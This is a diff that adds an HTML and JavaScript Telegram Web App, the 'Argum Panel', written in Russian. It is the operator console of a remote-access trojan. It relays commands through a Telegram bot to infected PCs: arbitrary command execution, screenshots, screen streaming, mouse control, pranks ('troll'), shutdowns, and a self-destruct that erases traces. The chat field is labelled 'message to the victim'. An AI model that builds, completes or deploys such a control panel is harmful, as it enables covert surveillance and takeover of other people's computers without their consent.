@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Аргум Панель</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-touch-callout: none; }
+        body { 
+            font-family: -apple-system, 'Segoe UI', system-ui, sans-serif;
+            background: #0a0a12; 
+            color: #fff; 
+            min-height: 100vh;
+            padding: 12px;
+            overflow-x: hidden;
+        }
+        .container { max-width: 420px; margin: 0 auto; }
+
+        .header { 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between;
+            padding: 8px 0 14px;
+            border-bottom: 1px solid rgba(30,30,58,0.4);
+            margin-bottom: 14px;
+        }
+        .header .logo { font-size: 28px; }
+        .header .title { 
+            font-size: 18px; 
+            font-weight: 700; 
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header .status {
+            font-size: 10px;
+            padding: 3px 10px;
+            border-radius: 20px;
+            background: rgba(46,204,113,0.15);
+            color: #2ecc71;
+            border: 1px solid rgba(46,204,113,0.2);
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(20,20,37,0.6);
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(30,30,58,0.3);
+        }
+        .status-bar .item { text-align: center; }
+        .status-bar .item .val { font-size: 14px; font-weight: 700; color: #00d4ff; }
+        .status-bar .item .lbl { font-size: 9px; color: #555577; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 10px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px; }
+
+        .card {
+            background: rgba(20,20,37,0.8);
+            border: 1px solid rgba(30,30,58,0.4);
+            border-radius: 14px;
+            padding: 12px 8px;
+            text-align: center;
+            transition: 0.15s;
+            cursor: pointer;
+            position: relative;
+        }
+        .card:active { transform: scale(0.94); background: rgba(30,30,58,0.6); }
+        .card .icon { font-size: 22px; display: block; margin-bottom: 2px; }
+        .card .label { font-size: 11px; font-weight: 600; color: #ccccee; }
+
+        .touchpad {
+            background: rgba(0,0,0,0.4);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 10px 0 14px;
+            border: 1px solid rgba(30,30,58,0.5);
+            min-height: 160px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            touch-action: none;
+            cursor: grab;
+        }
+        .touchpad:active { cursor: grabbing; }
+        .touchpad .pad-label { font-size: 12px; color: #444466; pointer-events: none; }
+        .touchpad .pad-pos { font-size: 11px; color: #00d4ff; font-family: monospace; margin-top: 6px; pointer-events: none; }
+        .touchpad .pad-controls {
+            display: flex;
+            gap: 6px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+            justify-content: center;
+            pointer-events: none;
+        }
+        .touchpad .pad-controls .btn-mini {
+            background: rgba(0,212,255,0.1);
+            border: 1px solid rgba(0,212,255,0.2);
+            border-radius: 8px;
+            padding: 4px 12px;
+            color: #00d4ff;
+            font-size: 10px;
+            font-weight: 600;
+            pointer-events: auto;
+            cursor: pointer;
+        }
+        .touchpad .pad-controls .btn-mini:active { background: rgba(0,212,255,0.2); }
+
+        .input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+        .input-group .input {
+            flex: 1;
+            padding: 10px 14px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(30,30,58,0.5);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+        }
+        .input-group .input:focus { border-color: #00d4ff; }
+        .input-group .btn {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.15s;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            color: #fff;
+        }
+        .input-group .btn:active { transform: scale(0.94); }
+
+        .btn-full {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.15s;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        .btn-full:active { transform: scale(0.97); }
+        .btn-primary { background: linear-gradient(135deg, #00d4ff, #7b2ffc); color: #fff; }
+        .btn-danger { background: linear-gradient(135deg, #ff4444, #cc3333); color: #fff; }
+        .btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: #fff; }
+        .btn-secondary { background: rgba(30,30,58,0.5); color: #8888aa; }
+
+        .chat-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            padding: 10px;
+            max-height: 140px;
+            overflow-y: auto;
+            margin-bottom: 8px;
+            border: 1px solid rgba(30,30,58,0.3);
+        }
+        .chat-box .msg {
+            padding: 6px 10px;
+            margin-bottom: 4px;
+            border-radius: 8px;
+            font-size: 12px;
+        }
+        .chat-box .msg.admin { 
+            background: rgba(0,212,255,0.08); 
+            border-left: 2px solid #00d4ff; 
+            color: #ccccee;
+        }
+        .chat-box .msg .time { font-size: 9px; color: #444466; float: right; }
+
+        .pc-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 10px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+            margin-bottom: 4px;
+            border: 1px solid transparent;
+        }
+        .pc-item:hover { border-color: rgba(0,212,255,0.2); }
+        .pc-item .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+        .pc-item .dot.online { background: #2ecc71; }
+        .pc-item .dot.offline { background: #ff4444; }
+        .pc-item .info { flex: 1; min-width: 0; }
+        .pc-item .info .name { font-size: 13px; font-weight: 600; color: #fff; }
+        .pc-item .info .ip { font-size: 10px; color: #555577; font-family: monospace; }
+        .pc-item .actions { display: flex; gap: 4px; }
+        .pc-item .actions button {
+            background: none;
+            border: none;
+            color: #555577;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 2px 4px;
+            border-radius: 4px;
+            transition: 0.15s;
+        }
+        .pc-item .actions button:hover { color: #00d4ff; background: rgba(0,212,255,0.05); }
+
+        .scroll { max-height: 160px; overflow-y: auto; }
+        .scroll::-webkit-scrollbar { width: 3px; }
+        .scroll::-webkit-scrollbar-thumb { background: #00d4ff; border-radius: 10px; }
+
+        .footer { text-align: center; color: #222244; font-size: 8px; margin-top: 16px; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        .fade { animation: fadeIn 0.25s ease; }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <div class="header">
+            <span class="logo">🧠</span>
+            <span class="title">Аргум</span>
+            <span class="status" id="statusBadge">● Онлайн</span>
+        </div>
+
+        <!-- ===== СТАТУС-БАР ===== -->
+        <div class="status-bar">
+            <div class="item"><div class="val" id="pcName">ПК-1</div><div class="lbl">Устройство</div></div>
+            <div class="item"><div class="val" id="pcIp">0.0.0.0</div><div class="lbl">IP</div></div>
+            <div class="item"><div class="val" id="pcUptime">00:00</div><div class="lbl">Время</div></div>
+        </div>
+
+        <!-- ===== ТАЧПАД ===== -->
+        <div class="touchpad" id="touchpad">
+            <div class="pad-label">🖱️ Ведите пальцем для управления мышью</div>
+            <div class="pad-pos" id="mousePos">X: 0 | Y: 0</div>
+            <div class="pad-controls">
+                <span class="btn-mini" id="clickLeft">🖱️ ЛКМ</span>
+                <span class="btn-mini" id="clickRight">🖱️ ПКМ</span>
+                <span class="btn-mini" id="scrollUp">⬆</span>
+                <span class="btn-mini" id="scrollDown">⬇</span>
+            </div>
+        </div>
+
+        <!-- ===== ГРИД ===== -->
+        <div class="grid-3">
+            <div class="card" data-action="screenshot"><span class="icon">📸</span><span class="label">Скрин</span></div>
+            <div class="card" data-action="troll"><span class="icon">🤡</span><span class="label">Тролль</span></div>
+            <div class="card" data-action="msg"><span class="icon">💬</span><span class="label">Сообщение</span></div>
+            <div class="card" data-action="site"><span class="icon">🌐</span><span class="label">Сайт</span></div>
+            <div class="card" data-action="volume"><span class="icon">🔊</span><span class="label">Громкость</span></div>
+            <div class="card" data-action="block"><span class="icon">🔒</span><span class="label">Блокировка</span></div>
+            <div class="card" data-action="restart"><span class="icon">🔄</span><span class="label">Рестарт</span></div>
+            <div class="card" data-action="wallpaper"><span class="icon">🖼️</span><span class="label">Обои</span></div>
+            <div class="card" data-action="shutdown"><span class="icon">⏹️</span><span class="label">Выкл</span></div>
+        </div>
+
+        <!-- ===== БЫСТРАЯ КОМАНДА ===== -->
+        <div class="input-group">
+            <input class="input" id="quickCmd" placeholder="⚡ Введите команду..." spellcheck="false">
+            <button class="btn" id="execBtn">▶</button>
+        </div>
+
+        <!-- ===== ЧАТ ===== -->
+        <div class="chat-box" id="chatBox">
+            <div class="msg admin"><span style="color:#00d4ff;">●</span> Чат активен</div>
+        </div>
+        <div class="input-group">
+            <input class="input" id="chatInput" placeholder="💬 Сообщение жертве..." spellcheck="false">
+            <button class="btn" id="chatSendBtn">📩</button>
+        </div>
+
+        <!-- ===== ПК ===== -->
+        <div style="margin-top:8px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                <span style="font-size:12px;color:#555577;">🖥️ ПК</span>
+                <button id="refreshPcs" style="background:none;border:none;color:#555577;font-size:12px;cursor:pointer;">⟳</button>
+            </div>
+            <div class="scroll" id="pcList">
+                <div class="pc-item"><div class="dot online"></div><div class="info"><div class="name">DESKTOP-7X9K2</div><div class="ip">192.168.1.10</div></div><div class="actions"><button data-action="screenshot_pc" data-pc="192.168.1.10">📸</button></div></div>
+                <div class="pc-item"><div class="dot online"></div><div class="info"><div class="name">LAPTOP-3F4A1</div><div class="ip">10.0.0.5</div></div><div class="actions"><button data-action="screenshot_pc" data-pc="10.0.0.5">📸</button></div></div>
+            </div>
+        </div>
+
+        <!-- ===== КНОПКИ ===== -->
+        <button class="btn-full btn-danger" id="selfDestructBtn">🧹 САМОУНИЧТОЖЕНИЕ</button>
+        <button class="btn-full btn-secondary" id="streamToggleBtn">📡 СТРИМ: ВЫКЛ</button>
+
+        <div class="footer">Автор не несёт ответственности</div>
+    </div>
+
+    <script>
+        // ===== TELEGRAM =====
+        const tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
+
+        function sendToBot(data) {
+            if (tg) { tg.sendData(JSON.stringify(data)); }
+            else { console.log('📤', data); }
+        }
+
+        function showPopup(title, message) {
+            if (tg) { tg.showPopup({ title, message, buttons: [{ type: 'ok' }] }); }
+            else { alert(title + '\n' + message); }
+        }
+
+        // ===== ТАЧПАД =====
+        const touchpad = document.getElementById('touchpad');
+        const mousePos = document.getElementById('mousePos');
+        let lastX = 0, lastY = 0;
+        let isDragging = false;
+
+        touchpad.addEventListener('touchstart', (e) => {
+            const touch = e.touches[0];
+            lastX = touch.clientX;
+            lastY = touch.clientY;
+            isDragging = true;
+        }, { passive: true });
+
+        touchpad.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+            if (!isDragging) return;
+            const touch = e.touches[0];
+            const dx = (touch.clientX - lastX) * 1.2;
+            const dy = (touch.clientY - lastY) * 1.2;
+            lastX = touch.clientX;
+            lastY = touch.clientY;
+            
+            if (Math.abs(dx) > 2 || Math.abs(dy) > 2) {
+                sendToBot({ action: 'mouse_move', x: Math.round(dx), y: Math.round(dy) });
+                mousePos.textContent = `X: ${Math.round(dx)} | Y: ${Math.round(dy)}`;
+            }
+        }, { passive: false });
+
+        touchpad.addEventListener('touchend', () => { isDragging = false; }, { passive: true });
+
+        document.getElementById('clickLeft').addEventListener('click', () => {
+            sendToBot({ action: 'mouse_click', button: 'left' });
+            showPopup('🖱️', 'Левый клик');
+        });
+        document.getElementById('clickRight').addEventListener('click', () => {
+            sendToBot({ action: 'mouse_click', button: 'right' });
+            showPopup('🖱️', 'Правый клик');
+        });
+        document.getElementById('scrollUp').addEventListener('click', () => {
+            sendToBot({ action: 'mouse_scroll', amount: 10 });
+        });
+        document.getElementById('scrollDown').addEventListener('click', () => {
+            sendToBot({ action: 'mouse_scroll', amount: -10 });
+        });
+
+        // ===== КАРТОЧКИ =====
+        document.querySelectorAll('[data-action]').forEach(el => {
+            el.addEventListener('click', function() {
+                const action = this.dataset.action;
+                if (action === 'screenshot') {
+                    sendToBot({ action: 'screenshot' });
+                    showPopup('📸', 'Скриншот сделан!');
+                } else if (action === 'troll') {
+                    sendToBot({ action: 'troll' });
+                    showPopup('🤡', 'Троллинг запущен!');
+                } else if (action === 'msg') {
+                    const text = prompt('💬 Введите текст:');
+                    if (text) { sendToBot({ action: 'msg', data: text }); showPopup('💬', 'Отправлено!'); }
+                } else if (action === 'site') {
+                    const url = prompt('🌐 Введите URL:');
+                    if (url) { sendToBot({ action: 'site', data: url }); showPopup('🌐', 'Сайт открыт!'); }
+                } else if (action === 'volume') {
+                    const val = prompt('🔊 Громкость (0-100):');
+                    if (val !== null) { sendToBot({ action: 'volume', data: parseInt(val) }); showPopup('🔊', 'Громкость '+val+'%'); }
+                } else if (action === 'block') {
+                    sendToBot({ action: 'block' });
+                    showPopup('🔒', 'Блокировка 3 сек!');
+                } else if (action === 'restart') {
+                    if (confirm('🔄 Перезагрузить ПК?')) { sendToBot({ action: 'restart' }); showPopup('🔄', 'Перезагрузка...'); }
+                } else if (action === 'wallpaper') {
+                    showPopup('🖼️', 'Отправьте картинку в бот');
+                } else if (action === 'shutdown') {
+                    if (confirm('⏹️ Выключить ПК?')) { sendToBot({ action: 'shutdown' }); showPopup('⏹️', 'Выключение...'); }
+                }
+            });
+        });
+
+        // ===== КОМАНДА =====
+        document.getElementById('execBtn').addEventListener('click', () => {
+            const cmd = document.getElementById('quickCmd').value;
+            if (cmd) { sendToBot({ action: 'exec', data: cmd }); showPopup('⚡', 'Команда выполнена!'); }
+        });
+        document.getElementById('quickCmd').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('execBtn').click();
+        });
+
+        // ===== ЧАТ =====
+        document.getElementById('chatSendBtn').addEventListener('click', () => {
+            const text = document.getElementById('chatInput').value;
+            if (text) {
+                sendToBot({ action: 'chat', data: text });
+                const box = document.getElementById('chatBox');
+                box.innerHTML += `<div class="msg admin"><span style="color:#00d4ff;">●</span> Вы: ${text} <span class="time">${new Date().toLocaleTimeString()}</span></div>`;
+                document.getElementById('chatInput').value = '';
+                box.scrollTop = box.scrollHeight;
+                showPopup('💬', 'Отправлено!');
+            }
+        });
+
+        // ===== ПК =====
+        document.getElementById('refreshPcs').addEventListener('click', () => {
+            sendToBot({ action: 'list_pcs' });
+            showPopup('🔄', 'Обновление...');
+        });
+
+        // ===== САМОУНИЧТОЖЕНИЕ =====
+        document.getElementById('selfDestructBtn').addEventListener('click', () => {
+            if (confirm('🧹 Удалить всё?')) { sendToBot({ action: 'selfdestruct' }); showPopup('🧹', 'Самоуничтожение...'); }
+        });
+
+        // ===== СТРИМ =====
+        let streamActive = false;
+        document.getElementById('streamToggleBtn').addEventListener('click', function() {
+            streamActive = !streamActive;
+            this.textContent = streamActive ? '📡 СТРИМ: ВКЛ' : '📡 СТРИМ: ВЫКЛ';
+            this.className = 'btn-full ' + (streamActive ? 'btn-success' : 'btn-secondary');
+            sendToBot({ action: streamActive ? 'stream_start' : 'stream_stop' });
+            showPopup('📡', streamActive ? 'Стрим запущен!' : 'Стрим остановлен');
+        });
+
+        // ===== КЛИКИ НА ПК =====
+        document.addEventListener('click', (e) => {
+            const btn = e.target.closest('[data-action="screenshot_pc"]');
+            if (btn) {
+                const pc = btn.dataset.pc || 'unknown';
+                sendToBot({ action: 'screenshot_pc', data: pc });
+                showPopup('📸', 'Скриншот запрошен!');
+            }
+        });
+
+        console.log('🧠 Аргум Панель загружена');
+    </script>
+</body>
+</html>
